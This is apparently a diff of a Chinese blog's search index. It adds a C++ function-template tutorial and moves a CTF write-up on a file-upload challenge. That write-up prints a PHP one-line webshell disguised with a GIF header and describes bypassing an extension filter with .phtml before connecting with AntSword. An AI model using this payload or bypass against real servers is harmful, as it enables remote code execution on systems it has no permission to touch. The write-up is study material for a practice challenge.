@@ -146,6 +146,43 @@
       </tags>
   </entry>
   <entry>
+    <title>C++中的函数模板</title>
+    <url>/2022/04/29/C-%E4%B8%AD%E7%9A%84%E7%B1%BB%E6%A8%A1%E6%9D%BF/</url>
+    <content><![CDATA[<h1 id="函数模板简介"><a href="#函数模板简介" class="headerlink" title="函数模板简介"></a>函数模板简介</h1><p>模板是C++的高级特性，分为<strong>函数模板</strong>和<strong>类模板</strong>，使用模板能够快速建立具有类型安全的类库合集和函数合集。</p>
+<p>这里我们主要介绍<strong>函数模板</strong></p>
+<p>函数模板不是一个实在的函数，编译器不能为其生成可执行代码。定义函数模板最后只是一个对函数功能框架的描述，当它具体执行时，将根据传递的实际参数决定功能。</p>
+<span id="more"></span>
+
+<h1 id="函数模板的定义"><a href="#函数模板的定义" class="headerlink" title="函数模板的定义"></a>函数模板的定义</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;参数类型及参数&gt; 返回类型 函数名 (形式参数)</span><br><span class="line">&#123;</span><br><span class="line">		<span class="comment">//函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也可以声明函数模板分成template部分和函数部分：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;参数类型&gt;</span><br><span class="line">返回类型 函数名 (形式参数)</span><br><span class="line">&#123;</span><br><span class="line">		<span class="comment">//函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>template为关键字，表示定义一个模板。<br>&lt;&gt;表示模板参数，模板参数有两种，是<strong>模板类型参数</strong>、<strong>模板非类型参数</strong>。模板类型参数使用关键字<strong>class或typedef</strong>开始，后面跟一个合法类型名。模板非类型参数与普通参数定义相同，通常是一个常数。可以不使用模板非类型参数。</p>
+<p>下面以<strong>求和函数为例解释函数模板</strong></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//定义求和函数模板 </span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">type</span>&gt;</span> <span class="comment">//这里的type可以是任意类型，关键看传入的是什么类型 </span></span><br><span class="line"><span class="function">type <span class="title">sum</span><span class="params">(type x,type y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">3</span>;</span><br><span class="line">	<span class="keyword">int</span> b=<span class="number">5</span>;</span><br><span class="line">	<span class="keyword">int</span> s=sum&lt;<span class="keyword">int</span>&gt;(a,b);<span class="comment">//调用函数模板 </span></span><br><span class="line">	cout&lt;&lt;s&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">double</span> c=<span class="number">1.23</span>;</span><br><span class="line">	<span class="keyword">double</span> d=<span class="number">2.45</span>;</span><br><span class="line">	<span class="keyword">double</span> m=sum&lt;<span class="keyword">double</span>&gt;(c,d);<span class="comment">//调用函数模板 </span></span><br><span class="line">	cout&lt;&lt;m;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对如上代码进行解释：<br>首先是声明一个模板<code>template&lt;calss type&gt;</code>，然后是定义函数模板的具体实现方法</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数模板								//自定义函数</span></span><br><span class="line"><span class="function">type <span class="title">sum</span><span class="params">(type x,type y)</span>				   <span class="comment">//int sum(int x,int y)	</span></span></span><br><span class="line"><span class="function"></span>&#123;									   <span class="comment">//&#123;</span></span><br><span class="line">    <span class="keyword">return</span> x+y;						   <span class="comment">//	return x+y;</span></span><br><span class="line">&#125;									   <span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>相比之下，模板函数在声明类型的情况下可以实现各种运算，而自定义函数只能实现单纯的int运算。</p>
+<p>所以，定义函数模板的有点就是<strong>适应各种类型对象</strong>的计算和输出。</p>
+<p>最后就是函数模板的调用</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> s=sum&lt;<span class="keyword">int</span>&gt;(a,b);</span><br><span class="line"><span class="keyword">double</span> m=sum&lt;<span class="keyword">double</span>&gt;(c,d);</span><br></pre></td></tr></table></figure>
+
+<p>这里的int和double就是使用模板的方式，即模板类型。若除去&lt;&gt;，就变成了</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> s=<span class="built_in">sum</span>(a,b);</span><br><span class="line"><span class="keyword">double</span> m=<span class="built_in">sum</span>(c,d);</span><br></pre></td></tr></table></figure>
+
+<p>这个跟自定义函数的使用方法相同。</p>
+<h1 id="函数模板入门应用"><a href="#函数模板入门应用" class="headerlink" title="函数模板入门应用"></a>函数模板入门应用</h1><p>使用数组作为模板参数，分别输出int数组和double数组的最大值</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">type</span>,<span class="title">int</span> <span class="title">len</span>&gt;</span></span><br><span class="line"><span class="function">type <span class="title">max</span><span class="params">(type a[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	type m=a[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(a[i]&gt;m)</span><br><span class="line">		&#123;</span><br><span class="line">			m=a[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">	<span class="keyword">double</span> y[]=&#123;<span class="number">1.2</span>,<span class="number">2.5</span>,<span class="number">1.6</span>,<span class="number">5.6</span>,<span class="number">7.8</span>,<span class="number">4.6</span>&#125;;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The max int is:&quot;</span>&lt;&lt;max&lt;<span class="keyword">int</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(x)/<span class="built_in"><span class="keyword">sizeof</span></span>(x[<span class="number">0</span>])&gt;(x)&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The max double is:&quot;</span>&lt;&lt;max&lt;<span class="keyword">double</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(y)/<span class="built_in"><span class="keyword">sizeof</span></span>(y[<span class="number">0</span>])&gt;(y);</span><br><span class="line">	<span class="comment">//补充：x.size()、x.length()是用于string类型的数组长度判断，不可用于整型 </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C++中的数组</title>
     <url>/2022/01/15/C-%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84/</url>
     <content><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>所谓数组，就是一个集合，里面存放了相同类型的数据元素</p>
@@ -3205,7 +3242,7 @@
 <h1 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h1><p>进去后发现可下载文件，我们下载后打开，发现没啥线索，既然是信息搜集，我们就要扫后台，扫描到.git文件，进去后，没有发现关键线索，但是发现了后台登录页面，但是不知道用户名和密码，实在没办法了，看大佬wp，发现我们要使用wireshark工具进行抓包，先开wireshark，然后再开exe文件，然后在包中尝试搜索User发现关键信息</p>
 <p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402180235715.png" alt="image-20220402180235715"></p>
 <p>这里的用户名和密码一看就是经过了base64加密。解密结果如下</p>
-<p>User：<a href="mailto:&#98;&#117;&#x67;&#x6b;&#x75;&#x6b;&#117;&#64;&#x31;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;">&#98;&#117;&#x67;&#x6b;&#x75;&#x6b;&#117;&#64;&#x31;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;</a></p>
+<p>User：<a href="mailto:&#x62;&#117;&#x67;&#x6b;&#x75;&#x6b;&#x75;&#64;&#49;&#x36;&#x33;&#x2e;&#99;&#x6f;&#109;">&#x62;&#117;&#x67;&#x6b;&#x75;&#x6b;&#x75;&#64;&#49;&#x36;&#x33;&#x2e;&#99;&#x6f;&#109;</a></p>
 <p>Pass：XSLROCPMNWWZQDZL</p>
 <p>登录显示密码错误，然后继续看wp</p>
 <p>知道邮箱可以用授权码登录，所以我们用第三方邮箱登录看看有什么关键信息</p>
@@ -3508,6 +3545,39 @@
       </tags>
   </entry>
   <entry>
+    <title>极客大挑战 2019Upload</title>
+    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
+    <content><![CDATA[<p>该题为上传木马题</p>
+<p>进入题目后，上传一句话木马</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
+<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
+<span id="more"></span>
+
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
+<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
+<p>上传失败</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
+<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
+<p>上传后</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
+<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
+<p>链接成功</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
+<p>最后在根目录下得到flag</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
+]]></content>
+      <tags>
+        <tag>webshell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第一次接触CTF</title>
     <url>/2021/11/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6CTF/</url>
     <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-白给-amp-签到"><a href="#1-白给-amp-签到" class="headerlink" title="1.白给&amp;签到"></a>1.白给&amp;签到</h2><p>没什么可说的，直接复制粘贴。</p>
@@ -3554,39 +3624,6 @@
 ]]></content>
       <tags>
         <tag>刷题</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>极客大挑战 2019Upload</title>
-    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
-    <content><![CDATA[<p>该题为上传木马题</p>
-<p>进入题目后，上传一句话木马</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
-<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
-<span id="more"></span>
-
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
-<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
-<p>得到</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
-<p>上传失败</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
-<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
-<p>上传后</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
-<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
-<p>链接成功</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
-<p>最后在根目录下得到flag</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
-]]></content>
-      <tags>
-        <tag>webshell</tag>
       </tags>
   </entry>
 </search>
